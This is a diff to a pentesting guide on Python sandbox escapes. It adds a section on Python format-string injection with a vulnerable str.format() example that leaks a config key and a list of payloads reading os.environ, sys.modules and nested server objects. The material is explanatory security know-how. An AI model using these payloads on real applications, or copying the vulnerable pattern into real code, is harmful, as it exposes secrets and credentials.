@@ -206,6 +206,9 @@ Checking the **`globals`** and **`locals`** is a good way to know what you can a
 # Obtain globals from a defined function
 get_flag.__globals__
 
+# Obtain globals from an object of a class
+class_obj.__init__.__globals__
+
 # Obtaining globals directly from loaded classes
 [ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
 [<class 'function'>]
@@ -455,7 +458,7 @@ def main():
     for i,element in enumerate(total):
         print(f"\rStatus: {i}/{len(total)}", end="")
         cont = 1
-        check_recursive(element, cont, "", str(element), i, True)
+        check_recursive(element, cont, "", str(element), f"Empty str {i}", True)
     
     print()
     print("Checking loaded subclasses...")
@@ -463,7 +466,7 @@ def main():
     for i,element in enumerate(total):
         print(f"\rStatus: {i}/{len(total)}", end="")
         cont = 1
-        check_recursive(element, cont, "", str(element), i, True)
+        check_recursive(element, cont, "", str(element), f"Subclass {i}", True)
     
     print()
     print("Checking from global functions...")
@@ -471,7 +474,7 @@ def main():
     for i,element in enumerate(total):
         print(f"\rStatus: {i}/{len(total)}", end="")
         cont = 1
-        check_recursive(element, cont, "", str(element), i, False)
+        check_recursive(element, cont, "", str(element), f"Global func {i}", False)
     
     print()
     print(SEARCH_FOR)
@@ -482,6 +485,50 @@ if __name__ == "__main__":
 ```
 
 ## Python Format String
+
+If you **send** a **string** to python that is going to be **formatted**, you can use `{}` to access **python internal information.** You can use the previous examples to access globals or builtins for example.
+
+{% hint style="info" %}
+However, there is a **limitation**, you can only use the symbols `.[]`, so you **won't be able to execute code**, just to read information.   
+_**If you know how to execute code through this vulnerability, please contact me.**_
+{% endhint %}
+
+```python
+# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
+CONFIG = {
+    "KEY": "ASXFYFGK78989"
+}
+
+class PeopleInfo:
+    def __init__(self, fname, lname):
+        self.fname = fname
+        self.lname = lname
+
+def get_name_for_avatar(avatar_str, people_obj):
+    return avatar_str.format(people_obj = people_obj)
+
+people = PeopleInfo('GEEKS', 'FORGEEKS')
+
+st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
+get_name_for_avatar(st, people_obj = people)
+```
+
+Note how you can **access attributes** in a normal way with a **dot** like `people_obj.__init__` and **dict element** with **parenthesis** without quotes `__globals__[CONFIG]`
+
+Also note that you can use `.__dict__` to enumerate elements of an object `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+
+### Sensitive Information Disclosure Payloads
+
+```python
+{whoami.__class__.__dict__}
+{whoami.__globals__[os].__dict__}
+{whoami.__globals__[os].environ}
+{whoami.__globals__[sys].path}
+{whoami.__globals__[sys].modules}
+
+# Access an element through several links
+{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+```
 
 ## Compiling Python to bypass Defenses
 
